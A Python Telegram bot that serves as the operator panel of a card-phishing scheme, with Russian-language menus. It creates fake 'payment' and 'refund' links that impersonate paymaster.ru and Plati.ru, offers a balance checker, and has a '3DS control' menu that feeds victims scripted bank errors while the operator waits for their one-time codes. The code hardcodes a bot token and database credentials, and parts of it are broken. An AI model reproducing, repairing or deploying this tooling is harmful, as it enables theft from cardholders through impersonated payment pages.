 # -*- coding: utf-8 -*-
import pymysql
pymysql.install_as_MySQLdb()
import time
import telebot
from telebot import types
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import mysql.connector
from datetime import datetime
import sys
import hashlib 
import random
import string
import MySQLdb

TOKEN = '7914210821:AAG7JOmmqW9EtpeZaQ8RqiwYI7Kv5BrQwnA' 
adminList = [7668429952]; 


mydb = MySQLdb.connect(
    host="localhost",
    user="user2",
    password="pass123",
    database="vbiv1"
)


mydb.ping(True)
mycursor = mydb.cursor()


try:    
    mycursor.execute("CREATE TABLE path (id INT AUTO_INCREMENT PRIMARY KEY, link VARCHAR(255), creator VARCHAR(255),method BOOLEAN, sum INT, x INT, ip VARCHAR(255), cheker BOOLEAN, success BOOLEAN, nomoney BOOLEAN, limited BOOLEAN, error BOOLEAN, threeds BOOLEAN, disablepay BOOLEAN, cardban BOOLEAN, notrucard BOOLEAN)")
    print("*создаём таблицу путей")
except Exception as e:
    print("таблица путей имеется")
    # print(e)  

try:    
    mycursor.execute("CREATE TABLE settings (id INT AUTO_INCREMENT PRIMARY KEY, domain VARCHAR(255), ip VARCHAR(255),token VARCHAR(255))")
    sql = "INSERT INTO settings (domain,ip,token) VALUES (%s,%s,%s)"
    val = ("http://paymaster.ru", "Plati.ru", TOKEN);
    mycursor.execute(sql,val)
    mydb.commit()
    print("*создаём таблицу настроек")
except Exception as e:
    print("таблица настроек имеется")
mycursor.close()   

def listener(messages):
    for m in messages:
        if m.content_type == 'text':
            # print the sent message to the console
            print(str(m.chat.first_name) + " [" + str(m.chat.id) + "]: " + m.text)
            print("stepFlag = " + str(stepFlag))
bot = telebot.TeleBot(TOKEN)
bot.set_update_listener(listener)  # register listener

def backButton(cid,txt):
	markup = types.ReplyKeyboardMarkup(resize_keyboard=True,one_time_keyboard=False)
	markup.row(types.KeyboardButton('Назад'))
	bot.send_message(cid, txt, reply_markup=markup, parse_mode= "Markdown")
	hideBoard = types.ReplyKeyboardRemove()

def adminMainMenu(cid, txt):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True,one_time_keyboard=False)
    markup.row(types.KeyboardButton('ℹ️Управление 3ds'))
    markup.row(types.KeyboardButton('▶️Оплата'), types.KeyboardButton('◀️Возврат'))
    markup.row(types.KeyboardButton('⏫Список'),types.KeyboardButton('🚮Удаление'))
    markup.row(types.KeyboardButton('🔣Настройки'))
    # markup.row(types.KeyboardButton('🈁Url платежки'))
    bot.send_message(cid, txt, reply_markup=markup, parse_mode= "Markdown")
    hideBoard = types.ReplyKeyboardRemove()

def adminSettingsMenu(cid,txt):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True,one_time_keyboard=False)
    markup.row(types.KeyboardButton('🈁Url платежки'))
    markup.row(types.KeyboardButton('🔤Организация на странице оплаты'))
    markup.row(types.KeyboardButton('Назад'))
    bot.send_message(cid, txt, reply_markup=markup, parse_mode= "Markdown")
    hideBoard = types.ReplyKeyboardRemove()

def form3dsMenu(cid,txt):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True,one_time_keyboard=False)
    markup.row(types.KeyboardButton('Успешно'),types.KeyboardButton('Нет денег'))
    markup.row(types.KeyboardButton('Неизвестная ошибка'),types.KeyboardButton('Лимит'))
    markup.row(types.KeyboardButton('Ошибка 3ds'),types.KeyboardButton('Запрещена онлайн оплата'))
    markup.row(types.KeyboardButton('Бан карты'),types.KeyboardButton('Карта не РФ'))
    markup.row(types.KeyboardButton('Назад'))
    bot.send_message(cid, txt, reply_markup=markup, parse_mode= "Markdown")
    hideBoard = types.ReplyKeyboardRemove()


summa = "";
checker = 0;
method = 0
stepFlag = 0; # главное меню

#---------------------------------------------------------------
@bot.message_handler(commands=['start'])
def command_start(m):
    cid = m.chat.id
    if cid in adminList:  
        adminMainMenu(cid,"Главное меню")
#---------------------------------------------------------------
@bot.message_handler(func=lambda message: message.text == 'Назад')
def command_rules(m):
    global stepFlag
    cid = m.chat.id
    if stepFlag==10 or stepFlag==0 or stepFlag==31 or stepFlag == 20 or stepFlag == 30 or stepFlag == 25 or stepFlag == 11 or stepFlag == 12 or stepFlag == 15 or stepFlag == 16 or stepFlag == 17:
        adminMainMenu(cid,"Главное меню")
        stepFlag = 0
    elif stepFlag == 21 or stepFlag == 22:
        stepFlag = 20
        adminSettingsMenu(cid,"Настройки платежки и страницы оплаты")

@bot.message_handler(func=lambda message: message.text == '▶️Оплата')
def command_rules(m):
    global stepFlag
    global method
    cid = m.chat.id
    if cid in adminList:
        backButton(cid,"Укажи сумму оплаты?⏬")
        stepFlag = 10
        method = 0;


@bot.message_handler(func=lambda message: message.text == '◀️Возврат')
def command_rules(m):
    global stepFlag
    global method
    cid = m.chat.id
    if cid in adminList:
        backButton(cid,"Укажи сумму возврата?⏬")
        stepFlag = 15
        method = 1;


@bot.message_handler(func=lambda message: message.text == '🔣Настройки')
def command_rules(m):
    global stepFlag
    cid = m.chat.id
    if cid in adminList:
        adminSettingsMenu(cid,"Настройки платежки и страницы оплаты")
        stepFlag = 20

@bot.message_handler(func=lambda message: message.text == '🈁Url платежки')
def command_rules(m):
    global stepFlag
    cid = m.chat.id
    if cid in adminList:

        try:
            mydb.ping(True)
            mycursor = mydb.cursor()
            sql = "SELECT domain FROM settings WHERE id = 1"
            mycursor.execute(sql)
            myresult = mycursor.fetchone()
            mycursor.close()
        except Exception as e:
            print(e)
        backButton(cid,"Текущий адресс платёжки: " +str(myresult[0])+ "\nДля установки нового адреса, вбейте его ниже⏬\n⚠️Адресс вводится без HTTP:// и слешей вконце⚠️")
        stepFlag = 21

@bot.message_handler(func=lambda message: message.text == '🔤Организация на странице оплаты')
def command_rules(m):
    global stepFlag
    cid = m.chat.id
    if cid in adminList:

        try:
            mydb.ping(True)
            mycursor = mydb.cursor()
            sql = "SELECT ip FROM settings WHERE id = 1"
            mycursor.execute(sql)
            myresult = mycursor.fetchone()
            mycursor.close()
        except Exception as e:
            print(e)
        backButton(cid,"Текущий организация: " +str(myresult[0])+ "\nДля установки названия, вбейте его ниже⏬")
        stepFlag = 22

@bot.message_handler(func=lambda message: message.text == '📌Создать📌')
def command_rules(m):
    global stepFlag
    cid = m.chat.id
    if cid in adminList and (stepFlag == 12 or stepFlag == 17 ):
        try:
            mydb.ping(True)
            mycursor = mydb.cursor()
            sql = "SELECT * FROM settings WHERE id = 1"
            mycursor.execute(sql)
            myresult = mycursor.fetchone()
            mycursor.close()

            result = hashlib.md5(str(random.randint(0,800000)).encode()).hexdigest() 
            linkgen = str(myresult[1]) + '/payments/' + result[0:8] +'-'+ result[8:16] +'-'+ result[16:24] +'-'+ result[24:32]

            mycursor = mydb.cursor()
            sql = "INSERT INTO path (link,creator,method,sum,x,ip,cheker,success,nomoney,limited,error,threeds,disablepay,cardban,notrucard) VALUES (%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s)"
            val = (linkgen,cid,method,summa,2,myresult[2],checker,0,0,0,0,0,0,0,0)
            mycursor.execute(sql, val)
            mydb.commit()
            mycursor.close()

            mycursor = mydb.cursor()
            sql = "SELECT id FROM path WHERE link = %s"
            val = (linkgen,)
            mycursor.execute(sql,val)
            myresult = mycursor.fetchone()
            mycursor.close()

            adminMainMenu(cid,"Ваша ссылка:\n"+linkgen+'\nID для 3ds управления: ' + str(myresult[0]) )            
        except Exception as e:
            bot.send_message(cid, e, parse_mode= "Markdown")


@bot.message_handler(func=lambda message: message.text == '⏫Список')
def command_rules(m):
    global stepFlag
    cid = m.chat.id
    if cid in adminList:
        try:
            mydb.ping(True)
            mycursor = mydb.cursor(buffered=True)
            sql = "SELECT id,link,method,sum,cheker FROM path"
            mycursor.execute(sql)
            myresult = mycursor.fetchall()
            mycursor.close()

            i = 0
            for x in myresult:
                bot.send_message(cid, "ID - " + str(myresult[i][0])+ " | Сумма: " + str(myresult[i][3]) + " | Метод (1-возврат) - " + str(myresult[i][2]) + "\nСсылка: " + str(myresult[i][1]), parse_mode= "Markdown")
                i=i+1
            adminMainMenu(cid,"Главное меню: ")            
        except Exception as e:
            bot.send_message(cid, e, parse_mode= "Markdown")

@bot.message_handler(func=lambda message: message.text == '🚮Удаление')
def command_rules(m):
    global stepFlag
    cid = m.chat.id
    if cid in adminList:
        backButton(cid,"Укажите ID ссылки для удаления. 0 - удалить всё")
        stepFlag = 25;

@bot.message_handler(func=lambda message: message.text == 'ℹ️Управление 3ds')
def command_rules(m):
    global stepFlag
    cid = m.chat.id
    if cid in adminList:
        stepFlag = 30;
        backButton(cid,"Введите ID ссылки для управления:")

#------------------------------------------------------------------------------------------------
@bot.message_handler(func=lambda message: message.text == 'Успешно')
def command_rules(m):
    global stepFlag
    cid = m.chat.id
    if cid in adminList and stepFlag == 31:
        try:
            mydb.ping(True)
            mycursor = mydb.cursor()
            sql = "UPDATE path SET success = 1 WHERE id = %s"
            val = (control[0],)
            mycursor.execute(sql, val)
            mydb.commit()
            mycursor.close()
        except Exception as e:
            bot.send_message(cid, e)
        form3dsMenu(cid,"Оплата подтверждена. Ожидаем новый код подтверждения")

@bot.message_handler(func=lambda message: message.text == 'Нет денег')
def command_rules(m):
    global stepFlag
    cid = m.chat.id
    if cid in adminList and stepFlag == 31:
        try:
            mydb.ping(True)
            mycursor = mydb.cursor()
            sql = "UPDATE path SET nomoney = 1 WHERE id = %s"
            val = (control[0],)
            mycursor.execute(sql, val)
            mydb.commit()
            mycursor.close()
        except Exception as e:
            bot.send_message(cid, e)
        form3dsMenu(cid,"На карте нет денег.")

@bot.message_handler(func=lambda message: message.text == 'Неизвестная ошибка')
def command_rules(m):
    global stepFlag
    cid = m.chat.id
    if cid in adminList and stepFlag == 31:
        try:
            mydb.ping(True)
            mycursor = mydb.cursor()
            sql = "UPDATE path SET error = 1 WHERE id = %s"
            val = (control[0],)
            mycursor.execute(sql, val)
            mydb.commit()
            mycursor.close()
        except Exception as e:
            bot.send_message(cid, e)
        form3dsMenu(cid,"Произошла неизвестная ошибка при оплате.")

@bot.message_handler(func=lambda message: message.text == 'Лимит')
def command_rules(m):
    global stepFlag
    cid = m.chat.id
    if cid in adminList and stepFlag == 31:
        try:
            mydb.ping(True)
            mycursor = mydb.cursor()
            sql = "UPDATE path SET limited = 1 WHERE id = %s"
            val = (control[0],)
            mycursor.execute(sql, val)
            mydb.commit()
            mycursor.close()
        except Exception as e:
            bot.send_message(cid, e)
        form3dsMenu(cid,"На карте закончился лимит по переводам.")

@bot.message_handler(func=lambda message: message.text == 'Ошибка 3ds')
def command_rules(m):
    global stepFlag
    cid = m.chat.id
    if cid in adminList and stepFlag == 31:
        try:
            mydb.ping(True)
            mycursor = mydb.cursor()
            sql = "UPDATE path SET threeds = 1 WHERE id = %s"
            val = (control[0],)
            mycursor.execute(sql, val)
            mydb.commit()
            mycursor.close()
        except Exception as e:
            bot.send_message(cid, e)
        form3dsMenu(cid,"Ошибка 3ds.")

@bot.message_handler(func=lambda message: message.text == 'Запрещена онлайн оплата')
def command_rules(m):
    global stepFlag
    cid = m.chat.id
    if cid in adminList and stepFlag == 31:
        try:
            mydb.ping(True)
            mycursor = mydb.cursor()
            sql = "UPDATE path SET disablepay = 1 WHERE id = %s"
            val = (control[0],)
            mycursor.execute(sql, val)
            mydb.commit()
            mycursor.close()
        except Exception as e:
            bot.send_message(cid, e)
        form3dsMenu(cid,"На карте выключена функция онлайн оплаты.")

@bot.message_handler(func=lambda message: message.text == 'Бан карты')
def command_rules(m):
    global stepFlag
    cid = m.chat.id
    if cid in adminList and stepFlag == 31:
        try:
            mydb.ping(True)
            mycursor = mydb.cursor()
            sql = "UPDATE path SET cardban = 1 WHERE id = %s"
            val = (control[0],)
            mycursor.execute(sql, val)
            mydb.commit()
            mycursor.close()
        except Exception as e:
            bot.send_message(cid, e)
        form3dsMenu(cid,"Карта забанена.")

@bot.message_handler(func=lambda message: message.text == 'Карта не РФ')
def command_rules(m):
    global stepFlag
    cid = m.chat.id
    if cid in adminList and stepFlag == 31:
        try:
            mydb.ping(True)
            mycursor = mydb.cursor()
            sql = "UPDATE path SET notrucard = 1 WHERE id = %s"
            val = (control[0],)
            mycursor.execute(sql, val)
            mydb.commit()
            mycursor.close()
        except Exception as e:
            bot.send_message(cid, e)
        form3dsMenu(cid,"Карта не Российскрго банка.")
#----------------------------------------------------------------------------------------------
control = ()

@bot.message_handler(func=lambda message: True, content_types=['text'])
def command_default(m):
    global stepFlag
    global summa
    global checker
    global control

    cid = m.chat.id
    text = m.text
    if stepFlag == 10:
        summa = text;
        backButton(cid,"Включить чекер баланса? (Да/Нет)")
        stepFlag = 11;
    elif stepFlag == 11:
        if text == "Да" or text == "да" or text == "ДА":
            checker = 1;
            stepFlag = 12
            txt = "Всё готово к созданию ссылки:\nТип - оплата\nСумма - "+summa+"\n Чекер - Включен"
            markup = types.ReplyKeyboardMarkup(resize_keyboard=True,one_time_keyboard=False)
            markup.row(types.KeyboardButton('📌Создать📌'))
            markup.row(types.KeyboardButton('Назад'))
            bot.send_message(cid, txt, reply_markup=markup, parse_mode= "Markdown")
            hideBoard = types.ReplyKeyboardRemove()

        elif text == "Нет" or text == "нет" or text == "НЕТ": 
            checker = 0
            stepFlag = 12
            txt = "Всё готово к созданию ссылки:\nТип - Оплата\nСумма - "+summa+"\n Чекер - Выключен"
            markup = types.ReplyKeyboardMarkup(resize_keyboard=True,one_time_keyboard=False)
            markup.row(types.KeyboardButton('📌Создать📌'))
            markup.row(types.KeyboardButton('Назад'))
            bot.send_message(cid, txt, reply_markup=markup, parse_mode= "Markdown")
            hideBoard = types.ReplyKeyboardRemove()
        else:
            bot.send_message(cid, "Нужно ответить да или нет", parse_mode= "Markdown")
    elif stepFlag == 15:
        stepFlag = 16;
        summa = text
        backButton(cid,"Включить чекер баланса? (Да/Нет)")
    elif stepFlag == 16:
        if text == "Да" or text == "да" or text == "ДА":
            checker = 1;
            stepFlag = 17
            txt = "Всё готово к созданию ссылки:\nТип - Возврат\nСумма - "+summa+"\n Чекер - Включен"
            markup = types.ReplyKeyboardMarkup(resize_keyboard=True,one_time_keyboard=False)
            markup.row(types.KeyboardButton('📌Создать📌'))
            markup.row(types.KeyboardButton('Назад'))
            bot.send_message(cid, txt, reply_markup=markup, parse_mode= "Markdown")
            hideBoard = types.ReplyKeyboardRemove()

        elif text == "Нет" or text == "нет" or text == "НЕТ": 
            checker = 0
            stepFlag = 17
            txt = "Всё готово к созданию ссылки:\nТип - Оплата\nСумма - "+summa+"\n Чекер - Выключен"
            markup = types.ReplyKeyboardMarkup(resize_keyboard=True,one_time_keyboard=False)
            markup.row(types.KeyboardButton('📌Создать📌'))
            markup.row(types.KeyboardButton('Назад'))
            bot.send_message(cid, txt, reply_markup=markup, parse_mode= "Markdown")
            hideBoard = types.ReplyKeyboardRemove()
        else:
            bot.send_message(cid, "Нужно ответить да или нет", parse_mode= "Markdown")
    elif stepFlag == 21:
        try:
            mydb.ping(True)
            mycursor = mydb.cursor()
            sql = "UPDATE settings SET domain = %s WHERE id = 1"
            val = (text,)
            mycursor.execute(sql, val)
            mydb.commit()
            mycursor.close()
            stepFlag = 20
            adminSettingsMenu(cid, "Новый адресс платежки установлен:\n"+text)
        except Exception as e:
            print(e)
    elif stepFlag == 22:
        try:
            mydb.ping(True)
            mycursor = mydb.cursor()
            sql = "UPDATE settings SET ip = %s WHERE id = 1"
            val = (text,)
            mycursor.execute(sql, val)
            mydb.commit()
            mycursor.close()
            stepFlag = 20
            adminSettingsMenu(cid, "Новое название организации:\n"+text)
        except Exception as e:
            print(e)
    elif stepFlag == 25:
        if text == '0':
            try:
                mycursor = mydb.cursor()
                mycursor.execute("DELETE FROM path")
                adminMainMenu(cid,"Все ссылки удалены!")
                stepFlag = 0;
            except Exception as e:
                bot.send_message(m.chat.id, e)
        else:
            try:
                mycursor = mydb.cursor()
                sql = "DELETE FROM path WHERE id = %s"
                adr = (text, )
                mycursor.execute(sql, adr)
                mydb.commit()
                adminMainMenu(cid,"Ссылка удалена!")
                stepFlag = 0;
            except Exception as e:
                bot.send_message(m.chat.id, e)
    elif stepFlag == 30:

        try:
            mydb.ping(True)
            mycursor = mydb.cursor()
            sql = "SELECT * FROM path WHERE id = %s"
            val = (text,)
            mycursor.execute(sql,val)
            myresult = mycursor.fetchone()
            mycursor.close()
        except Exception as e:
            print(e)

        if myresult == None:
            backButton(cid, 'Ссылка не найдена. Введите корректный ID ссылки:')
        else:
            control = myresult
            stepFlag = 31
            form3dsMenu(cid,"Форма управления 3DS")

#---------------------------------------------------------------------------------------------------

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    global newAgent
    cid = call.message.chat.id
    if call.data == "success": 
        form3dsMenu(cid,"Оплата подтверждена.\nОжидаем новый одноразовый код!")
        bot.delete_message(call.message.chat.id, call.message.id)


        try:
            mydb.ping(True)
            mycursor = mydb.cursor()
            sql = "UPDATE path SET success = 1 WHERE id = %s"
            val = (control[0],)
            mycursor.execute(sql, val)
            mydb.commit()
            mycursor.close()
        except Exception as e:
            bot.send_message(call.message.chat.id, e)
        
    elif call.data == "declineUsers":
        bot.delete_message(call.message.chat.id, call.message.id)
        form3ds(cid)

# Удаляем вебхук
bot.remove_webhook()

# Далее запускаем polling
bot.polling()
